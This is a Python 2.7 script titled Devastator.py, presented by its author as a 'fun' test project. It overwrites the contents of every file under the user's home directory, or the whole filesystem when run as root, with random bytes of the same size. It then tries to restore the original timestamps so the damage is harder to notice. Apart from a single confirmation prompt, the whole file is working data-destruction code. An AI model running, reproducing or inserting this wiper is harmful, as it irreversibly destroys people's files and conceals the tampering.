#!/usr/bin/python2.7
"""
==============================================================================
title           :Devastator.py
description     :Meant to damage your files, test project.
author          :Billias
date            :20140517
version         :0.1
usage           :Devastator.py
notes           :None
==============================================================================
"""
"""
   ~~~~~~~~ BIG FAT WARNING ~~~~~~~~
   CAUTION - Executing this it is your OWN responsibility....
   It can destroy your hard disk, and the author has no responsibility
   for whatever happens.
 
   This is a fun creation, meant to just increase my programming skills. This is a nice application, replacing all the
   file contents with a random content, by keeping the file size and atime / ctime
 
"""
 
 
from os import walk, geteuid, getenv, path, urandom, stat, utime
from progressbar import *
 
 
isroot = False
workingpath = getenv("HOME")
filecount = 0
 
def getuserid():
    global workingpath, isroot
    if geteuid() is "0":
        workingpath = "/"
        isroot=True
 
    return isroot
 
 
def welcome():
    global workingpath, isroot
 
    print "We are now going to randomize the content of some files.\n"
    if isroot:
        print "You are root,"
    else:
        print "You are not root,"
    print 'based on that we are going to wipe %s' % workingpath
 
def directory_listing():
    global filecount
    localcount = 0
 
    walklist = walk(workingpath, followlinks=True, topdown=True)
    pbarwidget = ['Completed ', Percentage(), '', Bar(marker='=',left='[',right=']')]
    print 'Working with path %s' % workingpath
    bar = ProgressBar(widgets=pbarwidget, maxval=filecount)
    bar.start()
    for dirName, subdirList, fileList in walklist:
        for fname in fileList:
            localcount += 1
            fileis = '%s/%s' % (dirName, fname)
            if path.isfile(fileis):
                sizeis = path.getsize(fileis)
                fstat = stat(fileis)
                f = open(fileis, 'w')
                f.write(urandom(sizeis))
                f.close()
 
                #some files cannot accept a/c time changes ;)
                try:
                    os.utime(fileis, (fstat.st_atime, fstat.st_mtime))
                except:
                    continue
                bar.update(localcount)
    bar.finish()
 
def confirmation():
    global filecount, workingpath
    yes = ["yes", "y", "ye"]
 
    walklist = walk(workingpath, followlinks=True, topdown=True)
 
    for a, b, c in walklist:
        for f in c:
            filecount += 1
 
    answeris = raw_input("\n\nAre you sure you want to randomize content of %d files (yes/no):" % filecount)
 
    if answeris.lower() not in yes:
        print "You didn't accept... bye bye"
        exit()
 
if __name__ == "__main__":
    getuserid()
    welcome()
    confirmation()
    directory_listing()